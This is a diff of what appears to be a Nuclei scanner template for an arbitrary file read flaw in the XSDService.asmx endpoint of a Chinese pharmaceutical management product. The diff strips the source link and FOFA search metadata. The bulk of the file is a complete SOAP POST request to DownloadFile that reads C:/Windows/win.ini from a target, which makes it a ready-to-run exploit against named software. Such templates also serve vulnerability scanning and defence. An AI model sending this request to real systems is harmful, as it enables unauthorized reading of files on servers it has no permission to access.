@@ -3,12 +3,8 @@ info:
   name: 黄药师药业管理软件XSDService.asmx存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rqcgfcuyge7znpx7'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rqcgfcuyge7znpx7
-    fofa: body="XSDService.asmx"
 http:
 - raw:
   - "POST /XSDService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Debian; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0\nConnection: close\nContent-Length: 499\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/DownloadFile\"\nAccept-Encoding: gzip, deflate, br\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <DownloadFile xmlns=\"http://tempuri.org/\">\n      <filePath>C:/Windows</filePath>\n      <fileName>win.ini</fileName>\n      <Offset>1</Offset>\n      <readLength>9</readLength>\n      <buffer>base64Binary</buffer>\n    </DownloadFile>\n  </soap:Body>\n</soap:Envelope>"
